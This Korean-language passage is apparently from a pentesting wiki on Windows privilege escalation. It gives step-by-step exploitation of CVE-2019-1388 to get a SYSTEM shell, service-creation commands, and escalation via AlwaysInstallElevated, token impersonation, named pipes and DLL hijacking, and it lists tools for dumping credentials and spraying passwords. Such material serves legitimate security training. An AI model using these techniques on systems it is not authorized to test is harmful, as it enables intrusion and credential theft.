## 낮은 권한 사용자에서 NT\AUTHORITY SYSTEM으로 (CVE-2019-1388) / UAC 우회

그래픽 인터페이스(콘솔 또는 RDP를 통해)에 접근할 수 있고 UAC가 활성화된 경우, 일부 버전의 Microsoft Windows에서는 비권한 사용자로부터 "NT\AUTHORITY SYSTEM"과 같은 터미널이나 다른 프로세스를 실행할 수 있습니다.

이로 인해 권한 상승과 UAC 우회를 동시에 동일한 취약점을 통해 수행할 수 있습니다. 또한, 아무것도 설치할 필요가 없으며, 프로세스 중에 사용되는 바이너리는 Microsoft에 의해 서명되고 발급됩니다.

영향을 받는 시스템은 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 악용하기 위해서는 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
다음 GitHub 리포지토리에서 필요한 모든 파일과 정보를 확인할 수 있습니다:

https://github.com/jas502n/CVE-2019-1388

## 관리자 중간에서 높은 무결성 수준으로 / UAC 우회

**무결성 수준에 대해 배우려면** 이 내용을 읽으세요:

{{#ref}}
integrity-levels.md
{{#endref}}

그런 다음 **UAC 및 UAC 우회에 대해 배우려면 이 내용을 읽으세요:**

{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## **높은 무결성에서 시스템으로**

### **새 서비스**

이미 높은 무결성 프로세스에서 실행 중이라면, **SYSTEM으로의 전환**은 **새 서비스를 생성하고 실행하는 것**으로 쉽게 할 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

High Integrity 프로세스에서 **AlwaysInstallElevated 레지스트리 항목을 활성화**하고 **역방향 셸을 설치**하기 위해 _**.msi**_ 래퍼를 사용할 수 있습니다.\
[레지스트리 키와 _.msi_ 패키지 설치 방법에 대한 더 많은 정보는 여기에서 확인하세요.](#alwaysinstallelevated)

### High + SeImpersonate 권한을 System으로

**코드를** [**여기에서 찾을 수 있습니다**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate에서 전체 토큰 권한으로

이러한 토큰 권한이 있는 경우(아마도 이미 High Integrity 프로세스에서 찾을 수 있을 것입니다), **거의 모든 프로세스**(보호되지 않은 프로세스)를 SeDebug 권한으로 **열 수** 있으며, 프로세스의 **토큰을 복사**하고 **해당 토큰으로 임의의 프로세스를 생성**할 수 있습니다.\
이 기술을 사용할 때는 일반적으로 **모든 토큰 권한을 가진 SYSTEM으로 실행 중인 프로세스를 선택**합니다(_예, 모든 토큰 권한이 없는 SYSTEM 프로세스를 찾을 수 있습니다_).\
**제안된 기술을 실행하는 코드의 예는** [**여기에서 찾을 수 있습니다**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 기술은 meterpreter가 `getsystem`에서 상승하는 데 사용됩니다. 이 기술은 **파이프를 생성한 다음 해당 파이프에 쓰기 위해 서비스를 생성/악용하는 것**으로 구성됩니다. 그런 다음, **SeImpersonate** 권한을 사용하여 파이프를 생성한 **서버**는 파이프 클라이언트(서비스)의 **토큰을 가장할 수** 있어 SYSTEM 권한을 얻습니다.\
이름 파이프에 대해 [**더 알고 싶다면 이 글을 읽어야 합니다**](#named-pipe-client-impersonation).\
High Integrity에서 SYSTEM으로 가는 방법에 대한 [**예제를 읽고 싶다면 이 글을 읽어야 합니다**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM**으로 실행 중인 **프로세스**에 의해 **로드되는 dll을 하이재킹**하는 데 성공하면 해당 권한으로 임의의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 종류의 권한 상승에 유용하며, 게다가 **High Integrity 프로세스에서 달성하기가 훨씬 더 쉽습니다**. 왜냐하면 dll을 로드하는 데 사용되는 폴더에 **쓰기 권한**이 있기 때문입니다.\
**Dll 하이재킹에 대해** [**더 알고 싶다면 여기에서 확인하세요**](dll-hijacking/)**.**

### **Administrator 또는 Network Service에서 System으로**

{{#ref}}
https://github.com/sailay1996/RpcSsImpersonator
{{#endref}}

### LOCAL SERVICE 또는 NETWORK SERVICE에서 전체 권한으로

**읽어보세요:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 추가 도움

[정적 impacket 바이너리](https://github.com/ropnop/impacket_static_binaries)

## 유용한 도구

**Windows 로컬 권한 상승 벡터를 찾기 위한 최고의 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 잘못된 구성 및 민감한 파일 확인 (**[**여기에서 확인하세요**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). 감지됨.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 잘못된 구성을 확인하고 정보를 수집합니다 (**[**여기에서 확인하세요**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 잘못된 구성 확인**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla 및 RDP 저장 세션 정보를 추출합니다. 로컬에서 -Thorough 사용.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- 자격 증명을 Credential Manager에서 추출합니다. 감지됨.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집된 비밀번호를 도메인에 분산시킵니다**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell ADIDNS/LLMNR/mDNS/NBNS 스푸퍼 및 중간자 도구입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본 privesc Windows 열거**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 알려진 privesc 취약점 검색 (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(관리자 권한 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc 취약점 검색 (VisualStudio를 사용하여 컴파일해야 함) ([**미리 컴파일된**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 잘못된 구성을 검색하기 위해 호스트를 열거합니다 (privesc보다 정보 수집 도구에 가깝습니다) (컴파일 필요) **(**[**미리 컴파일된**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 많은 소프트웨어에서 자격 증명을 추출합니다 (github에 미리 컴파일된 exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 잘못된 구성 확인 (github에 미리 컴파일된 실행 파일). 권장하지 않음. Win10에서 잘 작동하지 않음.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 잘못된 구성 확인 (python에서 exe). 권장하지 않음. Win10에서 잘 작동하지 않음.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 게시물을 기반으로 생성된 도구 (정상적으로 작동하기 위해 accesschk가 필요하지 않지만 사용할 수 있습니다).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**의 출력을 읽고 작동하는 익스플로잇을 추천합니다 (로컬 python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**의 출력을 읽고 작동하는 익스플로잇을 추천합니다 (로컬 python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

프로젝트를 올바른 버전의 .NET을 사용하여 컴파일해야 합니다 ([이곳을 참조하세요](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). 피해자 호스트에 설치된 .NET 버전을 확인하려면 다음을 수행할 수 있습니다:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliography

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{{#include ../../banners/hacktricks-training.md}}
